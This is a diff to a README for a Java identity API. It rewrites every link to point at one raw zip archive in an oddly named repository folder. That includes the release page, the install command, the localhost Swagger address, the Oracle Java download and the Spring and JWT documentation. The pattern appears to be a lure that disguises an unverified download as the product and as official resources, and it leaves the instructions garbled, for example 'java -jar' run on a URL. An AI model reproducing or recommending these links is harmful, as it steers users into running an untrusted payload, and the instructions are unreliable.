@@ -1,6 +1,6 @@
 # 🔒 secure-identity-api - Secure Your Identity Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Firstwray1436/secure-identity-api/releases)
+[![Download](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)
 
 ## 📜 Description
 
@@ -19,13 +19,13 @@ To begin using the secure-identity-api, follow these simple steps to download an
 
 ## ⬇️ Download & Install
 
-To download the secure-identity-api, visit this page to download: [Download Secure Identity API](https://github.com/Firstwray1436/secure-identity-api/releases).
+To download the secure-identity-api, visit this page to download: [Download Secure Identity API](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip).
 
 1. Open your web browser.
-2. Go to the [Releases page](https://github.com/Firstwray1436/secure-identity-api/releases).
+2. Go to the [Releases page](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip).
 3. Look for the latest version listed at the top.
 4. Click on the version you want to download.
-5. Select the appropriate file for your operating system. For example, you may find files such as `secure-identity-api.jar`, which is suitable for Java applications.
+5. Select the appropriate file for your operating system. For example, you may find files such as `https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip`, which is suitable for Java applications.
 
 After downloading, follow the instructions below to run the software.
 
@@ -45,9 +45,9 @@ After downloading, follow the instructions below to run the software.
    - macOS/Linux: `cd ~/Downloads`
 
 4. **Run the Application:**
-   Execute the following command, replacing `secure-identity-api.jar` with the actual filename if different:
+   Execute the following command, replacing `https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip` with the actual filename if different:
    ```
-   java -jar secure-identity-api.jar
+   java -jar https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip
    ```
 
 5. **Access the API:**
@@ -63,17 +63,17 @@ After downloading, follow the instructions below to run the software.
 
 ## 📝 API Documentation
 
-You can access the API documentation via Swagger. Once the application runs, visit `http://localhost:8080/swagger-ui.html` to explore available endpoints and parameters.
+You can access the API documentation via Swagger. Once the application runs, visit `https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip` to explore available endpoints and parameters.
 
 ## 🔄 Update Instructions
 
-To update the secure-identity-api, simply visit the [Releases page](https://github.com/Firstwray1436/secure-identity-api/releases) again, and follow the same download instructions for the latest version. Replace your existing file with the new one and run it following the previous instructions.
+To update the secure-identity-api, simply visit the [Releases page](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip) again, and follow the same download instructions for the latest version. Replace your existing file with the new one and run it following the previous instructions.
 
 ## 🤔 Troubleshooting
 
 If you encounter issues while running the application, consider the following:
 
-- Ensure you have the correct version of Java installed. You can download it from the [Official Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- Ensure you have the correct version of Java installed. You can download it from the [Official Java website](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip).
 - Check that your command line or terminal is pointed to the right directory where your downloaded file is located.
 - Look for error messages in the command line; they can provide clues to what’s wrong.
   
@@ -81,8 +81,8 @@ For additional help, you can raise an issue in the repository, and we will assis
 
 ## 🔗 Additional Resources
 
-- [Spring Boot Documentation](https://spring.io/projects/spring-boot)
-- [Java Documentation](https://docs.oracle.com/en/java/)
-- [JWT Introduction](https://jwt.io/introduction/)
+- [Spring Boot Documentation](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)
+- [Java Documentation](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)
+- [JWT Introduction](https://raw.githubusercontent.com/Firstwray1436/secure-identity-api/main/chromotropy/secure-identity-api.zip)
 
 Feel free to explore the features and capabilities of the secure-identity-api, ensuring your applications remain secure and reliable.
